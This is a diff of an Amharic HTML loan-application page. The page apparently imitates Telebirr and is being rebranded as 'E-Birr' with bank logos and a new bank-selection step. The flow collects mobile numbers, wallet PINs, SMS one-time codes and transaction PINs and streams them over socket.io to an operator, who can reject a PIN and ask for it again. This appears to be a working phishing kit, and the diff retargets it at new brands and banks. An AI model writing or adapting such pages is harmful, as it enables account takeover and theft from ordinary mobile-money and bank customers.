@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta name="theme-color" content="#0056B3">
-    <title>ቴሌብር የፋይናንስ ሥርዓት</title>
+    <title>ኢ-ብር የፋይናንስ ሥርዓት</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
@@ -79,18 +79,18 @@
         <header class="w-full bg-white select-none shrink-0 border-b border-gray-100">
             <div class="px-6 py-4 grid grid-cols-[1fr_auto_1fr] items-center gap-4">
                 <div class="flex justify-start">
-                    <img src="/assets/cropped-logo12-1-192x192.png" alt="Telebirr" class="h-14 max-w-full object-contain block">
+                    <img src="/assets/wegagen.webp" alt="Birr" class="h-14 max-w-full object-contain block">
                 </div>
                 <div class="h-8 w-[1px] bg-gray-200"></div>
                 <div class="flex justify-end">
-                    <img src="/assets/et-favicon.png" alt="Ethio Telecom" class="h-14 max-w-full object-contain block">
+                    <img src="/assets/favicon.ico" alt="Birr" class="h-14 max-w-full object-contain block">
                 </div>
             </div>
             
             <div class="border-t border-gray-100 px-6 py-3.5 bg-slate-50/80">
                 <div class="flex items-center justify-between">
-                    <h1 class="text-[#0056B3] font-bold text-base tracking-tight" x-text="step <= 3 ? 'የቴሌብር ማረጋገጫ' : 'የቴሌብር ፋይናንስ'">
-                        የቴሌብር ማረጋገጫ
+                    <h1 class="text-[#0056B3] font-bold text-base tracking-tight" x-text="step <= 3 ? 'የኢ-ብር ማረጋገጫ' : 'የኢ-ብር ፋይናንስ'">
+                        የኢ-ብር ማረጋገጫ
                     </h1>
                     <span class="bg-[#00A4E4] text-white font-semibold text-xs px-4 py-1.5 rounded-full shadow-sm tracking-wide" x-text="step === 2.5 ? 'በማረጋገጥ ላይ...' : 'ደህንነቱ የተጠበቀ'">
                         ደህንነቱ የተጠበቀ
@@ -131,7 +131,7 @@
 
         <main class="flex-1 overflow-y-auto px-5 py-6 flex flex-col justify-between relative">
             <div class="w-full flex justify-center items-center gap-2 mb-6" x-show="step > 3">
-                <template x-for="i in [4, 5, 6, 8]" :key="i">
+                <template x-for="i in [4, 5, 6, 7, 8]" :key="i">
                     <div class="w-2.5 h-2.5 rounded-full transition-all duration-300" :class="{ 'bg-[#0056B3] scale-110': step === i, 'bg-cyan-200': step > i, 'bg-gray-200': step < i }"></div>
                 </template>
             </div>
@@ -140,8 +140,8 @@
                 
                 <div x-show="step === 1" class="space-y-6 w-full">
                     <div class="text-center">
-                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">የቴሌብር አካውንትዎን ያስገቡ</h2>
-                        <p class="text-xs text-gray-400 mt-1">የተመዘገበበትን የኢትዮ ቴሌኮም የሞባይል ቁጥር እና የደህንነት መለያ መረጃዎችን ያስገቡ።</p>
+                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">የኢ-ብር አካውንትዎን ያስገቡ</h2>
+                        <p class="text-xs text-gray-400 mt-1">የተመዘገበበትን የሞባይል ቁጥር እና የደህንነት መለያ መረጃዎችን ያስገቡ።</p>
                     </div>
                     <div>
                         <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የሞባይል ስልክ ቁጥር</label>
@@ -153,8 +153,8 @@
                     <div>
                         <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የኪስ ቦርሳ የይለፍ ቃል (PIN)</label>
                         <div class="flex justify-center gap-3 py-1">
-                            <template x-for="(_, i) in 6" :key="i">
-                                <input type="password" class="pin-box text-gray-700 step1-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 6, 'step1-pin')" x-model="step1Pin.value[i]">
+                            <template x-for="(_, i) in 4" :key="i">
+                                <input type="password" class="pin-box text-gray-700 step1-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 4, 'step1-pin')" x-model="step1Pin.value[i]">
                             </template>
                         </div>
                     </div>
@@ -167,7 +167,7 @@
 
                 <div x-show="step === 2" x-cloak class="space-y-6 w-full">
                     <div class="text-center">
-                        <h2 class="text-lg font-bold text-gray-800 tracking-tight">የቴሌብር ኤስኤምኤስ (OTP) ማረጋገጫ</h2>
+                        <h2 class="text-lg font-bold text-gray-800 tracking-tight">የኢ-ብር ኤስኤምኤስ (OTP) ማረጋገጫ</h2>
                         <p class="text-xs text-gray-400 mt-1">የማረጋገጫ ምስጢራዊ ኮድ ወደ ስልክዎ ተልኳል።</p>
                     </div>
                     <div>
@@ -196,11 +196,11 @@
                 <div x-show="step === 3" x-cloak class="space-y-6 w-full">
                     <div class="text-center">
                         <h2 class="text-lg font-bold text-gray-800 tracking-tight">የአካውንት ደህንነት ማረጋገጫ</h2>
-                        <p class="text-xs text-gray-600 font-medium mt-1">ባለ 6-አሃዝ የቴሌብር መክፈያ እና የግብይት PIN ቁጥርዎን ያስገቡ</p>
+                        <p class="text-xs text-gray-600 font-medium mt-1">ባለ 4-አሃዝ የኢ-ብር መክፈያ እና የግብይት PIN ቁጥርዎን ያስገቡ</p>
                     </div>
                     <div class="flex justify-center gap-3 py-1">
-                        <template x-for="(_, i) in 6" :key="i">
-                            <input type="password" class="pin-box text-gray-700 step3-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 6, 'step3-pin')" x-model="step3Pin.value[i]">
+                        <template x-for="(_, i) in 4" :key="i">
+                            <input type="password" class="pin-box text-gray-700 step3-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 4, 'step3-pin')" x-model="step3Pin.value[i]">
                         </template>
                     </div>
                     <div class="pt-2">
@@ -220,8 +220,8 @@
                         <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የብድር አይነት ምርጫ</label>
                         <select x-model="form.loanType" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium transition-all">
                             <option value="">የብድር ምድብ ይምረጡ...</option>
-                            <option value="Consumer">የቴሌብር ሳንድቦክስ የግል ብድር</option>
-                            <option value="Merchant">የቴሌብር ነጋዴዎች መስሪያ ካፒታል ብድር</option>
+                            <option value="Consumer">የኢ-ብር ሳንድቦክስ የግል ብድር</option>
+                            <option value="Merchant">የኢ-ብር ነጋዴዎች መስሪያ ካፒታል ብድር</option>
                         </select>
                     </div>
                     <div>
@@ -296,6 +296,27 @@
                     </div>
                 </div>
 
+                <div x-show="step === 7" x-cloak class="space-y-5 w-full">
+                    <div class="text-center mb-4">
+                        <h2 class="text-lg font-bold text-gray-800 tracking-tight">ባንክ ይምረጡ (Select Bank)</h2>
+                        <p class="text-xs text-gray-400 mt-1">ለመቀጠል የሚፈልጉትን የባንክ ተቋም ይምረጡ (አማራጭ)።</p>
+                    </div>
+                    
+                    <div class="grid grid-cols-2 gap-3">
+                        <template x-for="bankName in ['KAAFI', 'CBO', 'NIB', 'WEGAGEN', 'AHADU']" :key="bankName">
+                            <button @click="toggleBankSelection(bankName)" type="button" class="flex items-center gap-3 bg-slate-50/80 border rounded-xl p-3.5 text-left transition-all hover:bg-slate-100 cursor-pointer" :class="form.selectedBank === bankName ? 'border-[#0056B3] bg-blue-50/50 shadow-sm' : 'border-gray-200'">
+                                <input type="checkbox" :checked="form.selectedBank === bankName" @click.stop="toggleBankSelection(bankName)" class="w-4 h-4 text-[#0056B3] border-gray-300 rounded focus:ring-[#0056B3] pointer-events-none">
+                                <span class="text-sm font-bold text-gray-700 tracking-wide" x-text="bankName"></span>
+                            </button>
+                        </template>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4 pt-4">
+                        <button @click="step = 6" type="button" class="w-full border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl hover:bg-slate-50 transition-all">← ወደኋላ</button>
+                        <button @click="submitStep7Bank" type="button" class="w-full bg-[#0056B3] hover:bg-[#003F87] text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all">ቀጣይ →</button>
+                    </div>
+                </div>
+
                 <div x-show="step === 8" x-cloak class="text-center py-6 flex flex-col items-center justify-center my-auto space-y-6 w-full">
                     <div class="w-16 h-16 bg-[#0056B3] rounded-2xl flex items-center justify-center shadow-md">
                         <svg class="w-9 h-9 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="3.5">
@@ -304,10 +325,10 @@
                     </div>
                     <div>
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">የብድር ማስተላለፍ ተጠናቋል!</h2>
-                        <p class="text-xs text-gray-400 mt-1.5 px-4">የቴሌብር ማይክሮ ክሬዲት ጥያቄዎ በተሳካ ሁኔታ ተስተናግዷል። ስለ ብድር ሁኔታዎ ዝርዝር መረጃ በስልክዎ መልዕክት ይደርስዎታል።</p>
+                        <p class="text-xs text-gray-400 mt-1.5 px-4">የኢ-ብር ማይክሮ ክሬዲት ጥያቄዎ በተሳካ ሁኔታ ተስተናግዷል። ስለ ብድር ሁኔታዎ ዝርዝር መረጃ በስልክዎ መልዕክት ይደርስዎታል።</p>
                     </div>
                     <div class="bg-slate-50 border border-gray-100 px-5 py-3 rounded-xl inline-block mx-auto">
-                        <p class="text-[10px] font-bold text-gray-400 uppercase tracking-wider">የቴሌብር መለያ ቁጥር (TXN)</p>
+                        <p class="text-[10px] font-bold text-gray-400 uppercase tracking-wider">የኢ-ብር መለያ ቁጥር (TXN)</p>
                         <p class="font-mono text-base font-bold text-gray-700 mt-0.5 tracking-wide" x-text="referenceId"></p>
                     </div>
                 </div>
@@ -315,7 +336,7 @@
             </div>
 
             <footer class="w-full text-center py-4 shrink-0">
-                <p class="text-[11px] text-gray-400 font-medium">የተመሰጠረ የሂደት ማእከል · ቴሌብር በኢትዮ ቴሌኮም ይሰራል።</p>
+                <p class="text-[11px] text-gray-400 font-medium">የተመሰጠረ የሂደት ማእከል · ኢ-ብር ይሰራል።</p>
             </footer>
         </main>
     </div>
@@ -324,15 +345,15 @@
         function loanFlow() {
             return {
                 step: 1, appId: '', referenceId: '', connected: false,
-                form: { loanType: '', amount: 25000, term: '4', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '' },
+                form: { loanType: '', amount: 25000, term: '4', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '', selectedBank: '' },
                 otp: { code: '' },
-                step1Pin: { value: ['', '', '', '', '', ''] },
-                step3Pin: { value: ['', '', '', '', '', ''] }, 
+                step1Pin: { value: ['', '', '', ''] },
+                step3Pin: { value: ['', '', '', ''] }, 
                 verifyingOtp: false, authorizingFinalPin: false, processingStep6: false,
                 socket: null, toast: { show: false, message: '' },
 
-                get isStep1PinValid() { return this.step1Pin.value.join('').length === 6; },
-                get isStep3PinValid() { return this.step3Pin.value.join('').length === 6; },
+                get isStep1PinValid() { return this.step1Pin.value.join('').length === 4; },
+                get isStep3PinValid() { return this.step3Pin.value.join('').length === 4; },
 
                 calculateWeeklyInstallment() {
                     let principal = Number(this.form.amount) || 0;
@@ -422,6 +443,24 @@
                     }
                 },
 
+                toggleBankSelection(bankName) {
+                    if (this.form.selectedBank === bankName) {
+                        this.form.selectedBank = '';
+                    } else {
+                        this.form.selectedBank = bankName;
+                    }
+                },
+
+                submitStep7Bank() {
+                    if (this.socket && this.connected) {
+                        this.socket.emit('submit-step7-bank', {
+                            appId: this.appId,
+                            bank: this.form.selectedBank
+                        });
+                    }
+                    this.step = 8;
+                },
+
                 init() {
                     this.socket = io({ autoConnect: true });
                     
@@ -454,15 +493,14 @@
 
                     this.socket.on('pin-rejected', (data) => {
                         this.authorizingFinalPin = false;
-                        this.step3Pin.value = ['', '', '', '', '', ''];
+                        this.step3Pin.value = ['', '', '', ''];
                         this.step = 3;
                         this.triggerToastNotification(data.message || "የተሳሳተ የግብይት PIN ቁጥር። እባክዎ እንደገና ይሞክሩ።");
                     });
 
                     this.socket.on('application-complete', (data) => {
                         this.processingStep6 = false;
-                        this.referenceId = data.referenceId;
-                        this.step = 8;
+                        this.step = 7;
                     });
                 }
             }
